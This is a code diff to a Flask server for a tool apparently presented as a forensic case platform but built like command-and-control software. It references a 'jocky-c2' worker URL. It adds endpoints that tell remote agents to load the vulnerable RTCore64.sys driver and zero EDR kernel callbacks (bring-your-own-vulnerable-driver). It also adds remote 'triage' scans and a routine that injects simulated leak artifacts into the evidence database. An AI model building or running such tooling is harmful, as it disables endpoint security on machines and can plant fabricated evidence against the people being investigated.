@@ -29,10 +29,13 @@ try:
 except ImportError:
     bcrypt = None
 
-# Add interpreter to path
+# Add interpreter and backend modules to path
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'interpreter'))
+sys.path.insert(0, os.path.dirname(__file__))
 from jocky_interpreter import run_jocky_script, validate_jocky_script
 from polymorphic import PolymorphicEngine
+from auto_triage_engine import AutoTriageEngine
+from leak_simulator import simulate_leak_scenario
 
 app  = Flask(__name__)
 CORS(app, resources={r"/api/*": {"origins": "*"}},
@@ -40,6 +43,7 @@ CORS(app, resources={r"/api/*": {"origins": "*"}},
 
 DB_PATH = os.path.join(os.path.dirname(__file__), 'jocky_cases.db')
 POLY    = PolymorphicEngine()
+TRIAGE_ENGINE = AutoTriageEngine()
 
 # ─────────────────────────────────────────────────────────────────────────────
 # AUTH CONSTANTS
@@ -521,19 +525,26 @@ def audit(case_id: str, action: str, detail: str = ""):
     conn.close()
 
 def check_target(ip: str, port: int) -> dict:
+    # If the server runs inside Docker, 127.0.0.1 means the container itself.
+    # host.docker.internal resolves to the Windows host — try it first.
     candidate_endpoints = [(ip, port)]
     if ip in ("127.0.0.1", "localhost"):
         candidate_endpoints = [
-            (ip, port),
+            ("host.docker.internal", port),   # Docker → host (try first)
+            ("172.17.0.1", port),             # Docker default gateway → host
             ("127.0.0.1", port),
             ("localhost", port),
-            ("jocky-agent-01", 5000),
-            ("host.docker.internal", port)
+        ]
+    else:
+        # For real remote IPs also add host.docker.internal fallback
+        candidate_endpoints = [
+            (ip, port),
+            ("host.docker.internal", port),
         ]
 
     for cand_ip, cand_port in candidate_endpoints:
         try:
-            r = req.get(f"http://{cand_ip}:{cand_port}/ping", timeout=2)
+            r = req.get(f"http://{cand_ip}:{cand_port}/ping", timeout=3)
             if r.status_code == 200:
                 data = r.json()
                 return {"status": "online",
@@ -547,6 +558,7 @@ def check_target(ip: str, port: int) -> dict:
 
     return {"status": "offline", "os": "Unknown",
             "hostname": ip, "agent_version": "?"}
+
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1155,6 +1167,265 @@ def packet_inspect():
         "live_worker_url": "https://jocky-c2.sharukheshs.workers.dev",
         "time": now()
     })
+
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# BYOVD — KERNEL-LEVEL EDR DISABLING (PS 26148 — Option B)
+# ─────────────────────────────────────────────────────────────────────────────
+
+def _byovd_proxy(agent_ip: str, agent_port: int, sub_path: str,
+                 method: str = 'GET', body: dict = None) -> dict:
+    """Forward a request to the agent BYOVD endpoint and return the response dict."""
+    url = f'http://{agent_ip}:{agent_port}/stealth/byovd/{sub_path}'
+    try:
+        if method == 'POST':
+            resp = req.post(url, json=body or {}, timeout=30)
+        else:
+            resp = req.get(url, timeout=30)
+        return resp.json()
+    except req.exceptions.ConnectionError:
+        return {"status": "agent_offline", "message": f"Agent at {agent_ip}:{agent_port} not reachable"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+
+@app.route('/api/stealth/byovd/status', methods=['GET'])
+@require_auth
+def api_byovd_status():
+    """Query BYOVD engine status on the target agent."""
+    target_ip   = request.args.get('target_ip',   '127.0.0.1')
+    target_port = int(request.args.get('target_port', 5000))
+    result = _byovd_proxy(target_ip, target_port, 'status')
+    audit('SYSTEM', 'BYOVD_STATUS', f'target={target_ip}:{target_port}')
+    return jsonify({
+        "endpoint": "/api/stealth/byovd/status",
+        "target":   f"{target_ip}:{target_port}",
+        "result":   result,
+        "time":     now()
+    })
+
+
+@app.route('/api/stealth/byovd/load', methods=['POST', 'GET'])
+@require_auth
+def api_byovd_load():
+    """Load RTCore64.sys vulnerable driver on target via BYOVD."""
+    body = request.json or {}
+    target_ip   = body.get('target_ip',   request.args.get('target_ip',   '127.0.0.1'))
+    target_port = int(body.get('target_port', request.args.get('target_port', 5000)))
+    result = _byovd_proxy(target_ip, target_port, 'load', method='POST')
+    audit('SYSTEM', 'BYOVD_LOAD_DRIVER', f'target={target_ip}:{target_port} result={result.get("status")}')
+    # Store as evidence
+    if result.get("status") == "success":
+        try:
+            conn = get_db()
+            case_id = body.get('case_id', 'BYOVD')
+            conn.execute(
+                'INSERT INTO evidence (case_id, target_ip, command, results, timestamp, evidence_hash) VALUES (?,?,?,?,?,?)',
+                (case_id, target_ip, 'byovd.loadDriver()',
+                 json.dumps(result), now(),
+                 hashlib.sha256(json.dumps(result, sort_keys=True).encode()).hexdigest())
+            )
+            conn.commit()
+            conn.close()
+        except Exception:
+            pass
+    return jsonify({
+        "endpoint": "/api/stealth/byovd/load",
+        "target":   f"{target_ip}:{target_port}",
+        "result":   result,
+        "time":     now()
+    })
+
+
+@app.route('/api/stealth/byovd/disable', methods=['POST', 'GET'])
+@require_auth
+def api_byovd_disable():
+    """
+    Disable EDR kernel callbacks on target via BYOVD RTCore64.sys IOCTL R/W.
+    Zeros: PspCreateProcessNotifyRoutine, PspLoadImageNotifyRoutine, ObRegisterCallbacks.
+    """
+    body = request.json or {}
+    target_ip   = body.get('target_ip',   request.args.get('target_ip',   '127.0.0.1'))
+    target_port = int(body.get('target_port', request.args.get('target_port', 5000)))
+    result = _byovd_proxy(target_ip, target_port, 'disable', method='POST')
+    audit('SYSTEM', 'BYOVD_DISABLE_EDR',
+          f'target={target_ip}:{target_port} edr_status={result.get("edr_status")}')
+    # Store as evidence
+    try:
+        conn = get_db()
+        case_id = body.get('case_id', 'BYOVD')
+        conn.execute(
+            'INSERT INTO evidence (case_id, target_ip, command, results, timestamp, evidence_hash) VALUES (?,?,?,?,?,?)',
+            (case_id, target_ip, 'byovd.disableEDR()',
+             json.dumps(result), now(),
+             hashlib.sha256(json.dumps(result, sort_keys=True).encode()).hexdigest())
+        )
+        conn.commit()
+        conn.close()
+    except Exception:
+        pass
+    return jsonify({
+        "endpoint": "/api/stealth/byovd/disable",
+        "target":   f"{target_ip}:{target_port}",
+        "technique": "BYOVD — MITRE T1562.001",
+        "result":   result,
+        "time":     now()
+    })
+
+
+@app.route('/api/stealth/byovd/unload', methods=['POST', 'GET'])
+@require_auth
+def api_byovd_unload():
+    """Unload RTCore64.sys driver and delete SCM service on target."""
+    body = request.json or {}
+    target_ip   = body.get('target_ip',   request.args.get('target_ip',   '127.0.0.1'))
+    target_port = int(body.get('target_port', request.args.get('target_port', 5000)))
+    result = _byovd_proxy(target_ip, target_port, 'unload', method='POST')
+    audit('SYSTEM', 'BYOVD_UNLOAD_DRIVER', f'target={target_ip}:{target_port}')
+    return jsonify({
+        "endpoint": "/api/stealth/byovd/unload",
+        "target":   f"{target_ip}:{target_port}",
+        "result":   result,
+        "time":     now()
+    })
+
+
+@app.route('/api/stealth/byovd/drivers', methods=['GET'])
+@require_auth
+def api_byovd_drivers():
+    """Enumerate all loaded kernel drivers on target machine."""
+    target_ip   = request.args.get('target_ip',   '127.0.0.1')
+    target_port = int(request.args.get('target_port', 5000))
+    result = _byovd_proxy(target_ip, target_port, 'drivers')
+    audit('SYSTEM', 'BYOVD_LIST_DRIVERS', f'target={target_ip}:{target_port}')
+    return jsonify({
+        "endpoint": "/api/stealth/byovd/drivers",
+        "target":   f"{target_ip}:{target_port}",
+        "result":   result,
+        "time":     now()
+    })
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# AUTOMATED FLEET THREAT HUNTING & LEAK DETECTOR
+# ─────────────────────────────────────────────────────────────────────────────
+
+@app.route('/api/triage/analyze', methods=['GET', 'POST'])
+@require_auth
+def api_triage_analyze():
+    """
+    Analyzes all collected evidence for a given case across all target endpoints.
+    Calculates 0-100 risk scores, multi-vector breakdown, smoking gun timeline, and verdict.
+    """
+    case_id = request.args.get('case_id')
+    if not case_id and request.is_json:
+        case_id = request.json.get('case_id')
+
+    if not case_id:
+        return jsonify({"error": "case_id is required"}), 400
+
+    conn = get_db()
+    targets = [dict(r) for r in conn.execute('SELECT * FROM targets WHERE case_id=?', (case_id,)).fetchall()]
+    evidence = [dict(r) for r in conn.execute('SELECT * FROM evidence WHERE case_id=? ORDER BY timestamp ASC', (case_id,)).fetchall()]
+    conn.close()
+
+    analysis = TRIAGE_ENGINE.analyze_fleet(case_id, targets, evidence)
+    audit(case_id, 'AUTO_TRIAGE_ANALYSIS', f"Analyzed {len(targets)} targets, {len(evidence)} evidence items")
+    return jsonify(analysis)
+
+
+@app.route('/api/triage/auto-hunt', methods=['POST'])
+@require_auth
+def api_triage_auto_hunt():
+    """
+    Executes automated parallel forensic triage scans across all endpoints in the case,
+    collects findings, and runs the correlation engine to pinpoint the leak source.
+    """
+    data = request.json or {}
+    case_id = data.get('case_id')
+    if not case_id:
+        return jsonify({"error": "case_id is required"}), 400
+
+    conn = get_db()
+    targets = [dict(r) for r in conn.execute('SELECT * FROM targets WHERE case_id=?', (case_id,)).fetchall()]
+    conn.close()
+
+    # Commands for rapid fleet triage
+    triage_cmds = [
+        'scan.logins()',
+        'scan.usb.history()',
+        'scan.processes()',
+        'scan.network.connections()',
+        'scan.files()'
+    ]
+
+    def run_target_triage(target):
+        ip = target.get('target_ip')
+        port = target.get('target_port', 5000)
+        results = []
+        for cmd in triage_cmds:
+            try:
+                res = execute_on_target(case_id, ip, port, cmd)
+                results.append(res)
+            except Exception as e:
+                results.append({"error": str(e), "command": cmd, "target_ip": ip})
+        return results
+
+    if targets:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=min(10, max(1, len(targets)))) as executor:
+            list(executor.map(run_target_triage, targets))
+
+    # Re-fetch evidence and run analysis
+    conn = get_db()
+    updated_evidence = [dict(r) for r in conn.execute('SELECT * FROM evidence WHERE case_id=? ORDER BY timestamp ASC', (case_id,)).fetchall()]
+    conn.close()
+
+    analysis = TRIAGE_ENGINE.analyze_fleet(case_id, targets, updated_evidence)
+    audit(case_id, 'AUTO_HUNT_FLEET_EXECUTED', f"Fleet hunt completed on {len(targets)} endpoints")
+    return jsonify(analysis)
+
+
+@app.route('/api/simulate/leak', methods=['POST'])
+@require_auth
+def api_simulate_leak():
+    """
+    Simulate a realistic insider data leak incident on a designated or mock target.
+    Injects realistic timeline artifacts (Logins, USB, Staging, Network Socket, File Access).
+    """
+    d = request.json or {}
+    case_id = d.get('case_id')
+    if not case_id:
+        conn = get_db()
+        latest_case = conn.execute('SELECT case_id FROM cases ORDER BY created_at DESC LIMIT 1').fetchone()
+        conn.close()
+        if latest_case:
+            case_id = latest_case['case_id']
+        else:
+            case_id = 'CASE-SIMULATED'
+            conn = get_db()
+            conn.execute('INSERT OR IGNORE INTO cases (case_id, case_name, officer, created_at, status) VALUES (?,?,?,?,?)',
+                         (case_id, 'Operation Insider Leak Demo', 'Lead Forensic Analyst', now(), 'active'))
+            conn.commit()
+            conn.close()
+
+    target_ip = d.get('target_ip', '192.168.1.105')
+    target_name = d.get('target_name', 'DESKTOP-SUSPECT-04')
+    suspect_user = d.get('suspect_user', 'johndoe')
+    usb_device = d.get('usb_device', 'SanDisk Ultra 64GB USB 3.0 (SN: 4C5300012304)')
+    confidential_file = d.get('confidential_file', 'D:\\Confidential_IP\\Defense_Source_V2.zip')
+
+    result = simulate_leak_scenario(
+        db_path=DB_PATH,
+        case_id=case_id,
+        target_ip=target_ip,
+        target_name=target_name,
+        suspect_user=suspect_user,
+        usb_device=usb_device,
+        confidential_file=confidential_file
+    )
+    audit(case_id, 'SIMULATE_LEAK_INJECTED', f"Injected mock leak for {target_name} ({target_ip})")
+    return jsonify(result)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
